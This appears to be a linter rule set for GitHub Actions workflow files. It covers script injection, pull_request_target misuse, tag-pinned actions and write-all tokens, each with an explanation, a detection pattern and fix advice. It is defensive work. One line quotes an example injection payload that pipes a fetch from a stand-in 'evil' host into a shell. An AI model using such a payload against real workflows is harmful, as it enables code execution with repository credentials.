description: GitHub Actions workflow invariants. Workflow YAML is executable CI config running with repository credentials, so the recurring failures are RCE-shaped: attacker-controllable event fields interpolated into `run:` shells (the classic GHA script-injection RCE), the `pull_request_target` trigger that runs with write tokens against fork PRs, third-party actions pinned by a mutable tag/branch (an upstream retag silently ships new code into CI), and a blanket `permissions: write-all` that hands every scope to every job. Scoped tightly to `.github/workflows/*.yml|yaml` so non-workflow YAML is never touched. Rules: gha-script-injection, gha-pull-request-target, gha-unpinned-action, gha-permissions-write-all.

rules.//: Script injection: a ${{ github.event.* }} expression referencing an ATTACKER-CONTROLLABLE field (issue/PR title+body, comment/review body, head_ref, pull_request.head.ref/label). When such a value is interpolated directly into a `run:` shell, the runner expands it before the shell sees it, so a title of `"; curl evil | sh; #` is RCE with the workflow's token. WARN, not HARD, because the linter is context-blind: the SAME expression on an `env:`/`with:` assignment line is the RECOMMENDED MITIGATION (bind to an intermediate env var, then reference `$VAR` in run), and that safe line also matches. Reviewer confirms: if the expression is inline in a `run:` step it is a vuln — move it to an `env:` block and reference the env var (quoted) in the script; if it IS the env-var binding, this is the fix and can be suppressed with a preceding `# noqa: gha-script-injection`.
rules.message: Attacker-controllable ${{ github.event.* }} value (issue/PR title or body, comment/review body, head_ref) — interpolating this into a `run:` shell is the classic GitHub Actions script-injection RCE. Bind it to an intermediate `env:` variable and reference the quoted env var ($VAR) in run, never inline. If this line IS the env-var binding (the fix), suppress with a preceding `# noqa: gha-script-injection`.

rules.//: pull_request_target runs the BASE repo's workflow with a read-write GITHUB_TOKEN and access to secrets, while the event is triggered by a (possibly forked) PR. If the workflow then checks out and builds/executes the PR head, untrusted code runs with write credentials — a well-known privilege-escalation pattern. Three YAML trigger forms are detected: (1) mapping key `pull_request_target:`, (2) block-sequence item `- pull_request_target`, (3) inline-list `on: [pull_request_target]` or `on: [push, pull_request_target]`. All use the `m` flag for line-anchored matching. WARN to force a human to confirm the workflow does not check out + execute untrusted PR head code with the elevated token; if it only reads PR metadata it can be legitimate.
rules.message: pull_request_target trigger — runs with a read-write token and secrets on PRs from forks. Dangerous if the job checks out and builds/runs the PR head (untrusted code with write credentials). Confirm it never executes PR head code with the elevated token; prefer `pull_request` plus a separate, least-privileged labeled workflow for tasks needing secrets.

rules.//: Third-party action pinned by a MUTABLE ref (tag like @v4, branch like @main) instead of a full 40-hex commit SHA. A tag/branch can be force-moved by the upstream owner (or a compromised account) to point at new code, which then runs in CI with the repo's token on the next run — a supply-chain RCE with no change to this repo. The negative lookahead `(?!actions/|github/)` excludes GitHub's own first-party actions (lower, though not zero, risk; excluded to cut noise). `(?![0-9a-f]{40})` after `@` exempts a proper 40-hex SHA pin. `[\w.-]+/[\w.-]+@` matches a plain `owner/repo@ref`; subpath actions (`owner/repo/dir@ref`) and local (`./...`) or docker (`docker://...`) refs do not match and are not flagged (known scope limitation — pin those by SHA too). WARN: pinning by SHA is the right fix, but a deliberate internal-org action on a tag can be suppressed with a preceding `# noqa: gha-unpinned-action`.
rules.message: Third-party action pinned by a mutable tag/branch instead of a 40-hex commit SHA — the upstream owner can retag it to new code that then runs in CI with your token. Pin to a full commit SHA (`uses: owner/repo@<40-hex-sha>  # v1.2.3`). First-party actions/* and github/* are exempted. If this is a deliberate internal-org pin, suppress with a preceding `# noqa: gha-unpinned-action`.

rules.//: permissions: write-all grants every available scope (contents, packages, deployments, id-token, ...) to the workflow's GITHUB_TOKEN, so any compromised step or pulled-in action gets full write access to the repo. The least-privilege default is `permissions: {}` (or read-only) with per-job grants of only the scopes needed. HARD because there is no benign reason to write-all a token: it is always an over-grant and the fix is mechanical (declare the minimal scopes). Matches the explicit `permissions: write-all` form; the safe block/mapping form (`permissions:` then scoped keys) does not match.
rules.message: permissions: write-all grants the GITHUB_TOKEN every scope — a compromised step or action gets full write access to the repo. Set `permissions: {}` (or read-only) at the top level and grant only the specific scopes each job needs (e.g. `contents: read`, `id-token: write`).
